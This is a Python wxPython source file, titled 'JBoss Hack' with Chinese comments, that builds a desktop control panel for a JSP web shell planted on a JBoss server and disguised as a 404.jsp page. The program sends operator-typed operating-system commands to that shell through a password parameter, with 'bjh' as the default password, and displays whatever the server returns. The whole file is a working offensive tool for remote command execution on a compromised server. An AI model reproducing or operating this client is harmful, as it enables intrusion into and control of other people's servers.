#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import wx
import requests

# begin wxGlade: extracode
# end wxGlade


class MyFrame(wx.Frame):
    def __init__(self, *args, **kwds):
        # begin wxGlade: MyFrame.__init__
        # 初始化组件,由wxGlade产生
        kwds["style"] = wx.DEFAULT_FRAME_STYLE
        wx.Frame.__init__(self, *args, **kwds)
        self.panel_1 = wx.Panel(self, -1)
        self.sizer_3_staticbox = wx.StaticBox(self.panel_1, -1, u"console")
        self.label_2 = wx.StaticText(self.panel_1, -1, u"URL:")
        self.ip_ctrl = wx.TextCtrl(self.panel_1, -1, "http://xxx:9090/xxx/404.jsp")
        self.label_5 = wx.StaticText(self.panel_1, -1, u"             密码:")
        self.pwd_ctrl = wx.TextCtrl(self.panel_1, -1, "bjh")
        self.label_6 = wx.StaticText(self.panel_1, -1, u"返回信息")
        self.info_ctrl = wx.TextCtrl(self.panel_1, -1, "", style=wx.TE_MULTILINE)
        self.label_7 = wx.StaticText(self.panel_1, -1, u"发送指令")
        self.cmd_ctrl = wx.TextCtrl(self.panel_1, -1, "", style=wx.TE_MULTILINE)
        self.send_btn = wx.Button(self.panel_1, -1, u"发送指令")

        # 组件添加属性值,由wxGlade产生
        self.__set_properties()
        self.__do_layout()
        # 按钮事件绑定,由wxGlade产生
        self.Bind(wx.EVT_BUTTON, self.OnSend, self.send_btn)
        self.Bind(wx.EVT_TEXT_ENTER, self.OnSend, self.cmd_ctrl)
        # end wxGlade

    # 发送指令
    def sendCommand(self, url, cmd, pwd):
        try:
            res=requests.post(url+"?"+pwd+"="+cmd, timeout=10).text
            res = res.replace('<BR>', '')
            self.info_ctrl.AppendText(res)
        except:
            self.info_ctrl.AppendText("Run Error!")

    # 组件属性赋值,由wxGlade产生
    def __set_properties(self):
        # begin wxGlade: MyFrame.__set_properties
        self.SetTitle("JBoss Hack By:Xi4okv")
        self.SetSize((650, 800))
        self.info_ctrl.SetMinSize((600, 600))
        self.cmd_ctrl.SetMinSize((600, 30))
        self.send_btn.Enable(True)

        # end wxGlade
    # 界面布局,由wxGlade产生(wxGlade的确是个好东西!)  
    def __do_layout(self):
        # begin wxGlade: MyFrame.__do_layout
        sizer_2 = wx.BoxSizer(wx.VERTICAL)
        sizer_3 = wx.StaticBoxSizer(self.sizer_3_staticbox, wx.VERTICAL)
        grid_sizer_4 = wx.GridSizer(1, 4, 0, 0)
        grid_sizer_3 = wx.GridSizer(1, 1, 0, 0)
        sizer_4 = wx.BoxSizer(wx.HORIZONTAL)
        sizer_8 = wx.BoxSizer(wx.HORIZONTAL)
        sizer_7 = wx.BoxSizer(wx.HORIZONTAL)
        sizer_6 = wx.BoxSizer(wx.HORIZONTAL)
        sizer_5 = wx.BoxSizer(wx.HORIZONTAL)
        sizer_5.Add(self.label_2, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL, 0)
        sizer_5.Add(self.ip_ctrl, 5, wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL, 0)
        sizer_4.Add(sizer_5, 1, wx.EXPAND, 0)
        sizer_4.Add(sizer_7, 1, wx.EXPAND, 0)
        sizer_8.Add(self.label_5, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL, 0)
        sizer_8.Add(self.pwd_ctrl, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL, 0)
        sizer_4.Add(sizer_8, 1, wx.EXPAND, 0)
        sizer_3.Add(sizer_4, 1, wx.EXPAND, 0)
        sizer_3.Add(self.label_6, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL, 0)
        sizer_3.Add(self.info_ctrl, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL, 0)
        sizer_3.Add(self.label_7, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL, 0)
        sizer_3.Add(self.cmd_ctrl, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL, 0)
        grid_sizer_3.Add(self.send_btn, 0, wx.ALIGN_RIGHT|wx.ALIGN_CENTER_VERTICAL, 0)
        sizer_3.Add(grid_sizer_3, 1, wx.EXPAND, 0)
        sizer_3.Add(grid_sizer_4, 1, wx.EXPAND, 0)
        self.panel_1.SetSizer(sizer_3)
        sizer_2.Add(self.panel_1, 1, wx.EXPAND|wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL, 0)
        self.SetSizer(sizer_2)
        self.Layout()
        # end wxGlade
    # 响应"发送指令"按钮动作,执行发送操作
    def OnSend(self, event): # wxGlade: MyFrame.<event_handler>
        self.sendCommand(str(self.ip_ctrl.GetValue()), str(self.cmd_ctrl.GetValue()), str(self.pwd_ctrl.GetValue()))
        self.cmd_ctrl.SetValue("")
 
# end of class MyFrame  
  
# 主程序入口,这个也是wxGlade产生的  
if __name__ == "__main__":
    app = wx.App(0)
    # wx.InitAllImageHandlers()
    frame_1 =MyFrame(None, -1, "")
    app.SetTopWindow(frame_1)
    frame_1.Show()
    app.MainLoop()
